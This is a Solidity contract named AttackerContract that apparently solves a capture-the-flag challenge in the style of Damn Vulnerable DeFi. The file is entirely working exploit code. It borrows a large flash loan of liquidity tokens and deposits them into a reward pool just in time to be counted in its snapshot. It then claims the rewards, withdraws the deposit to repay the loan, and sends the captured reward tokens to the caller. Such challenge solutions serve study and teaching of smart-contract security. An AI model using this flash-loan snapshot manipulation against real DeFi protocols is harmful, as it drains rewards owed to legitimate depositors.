// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

interface IDVToken {
    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address to, uint256 amount) external returns (bool);
}

interface IRewardToken {
    function balanceOf(address account) external returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);
}

interface IRewarder {
    function liquidityToken() external returns (IDVToken);

    function rewardToken() external returns (IRewardToken);

    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;

    function distributeRewards() external returns (uint256);
}

interface IFlashLoan {
    function flashLoan(uint256 amount) external;
}

contract AttackerContract {
    IDVToken dvToken;
    IRewardToken rewardToken;
    IFlashLoan flashLoanerPool;
    IRewarder rewarder;

    constructor(address addrRewarder, address addrFlashLoan) {
        dvToken = IRewarder(addrRewarder).liquidityToken();
        rewardToken = IRewarder(addrRewarder).rewardToken();
        flashLoanerPool = IFlashLoan(addrFlashLoan);
        rewarder = IRewarder(addrRewarder);
    }

    function exploit() external {
        // Take a loan and call receiveFlashLoan.
        flashLoanerPool.flashLoan(1000000 ether);

        // Send rewards from exploit contract to attacker's account
        uint256 rewardsAmt = rewardToken.balanceOf(address(this));
        rewardToken.transfer(msg.sender, rewardsAmt);
    }

    function receiveFlashLoan(uint256 amount) external {
        // As after 5 days we are the firsts, we can still deposits (our flashloaned DVTokens)
        // and be included in the snapshot.
        dvToken.approve(address(rewarder), amount);
        rewarder.deposit(amount);
        // Get the token rewards.
        rewarder.distributeRewards();
        // Rescue our flashloaned dvTokens from the rewarder contract to pay flashloan.
        rewarder.withdraw(amount);
        dvToken.transfer(address(flashLoanerPool), amount);
    }
}
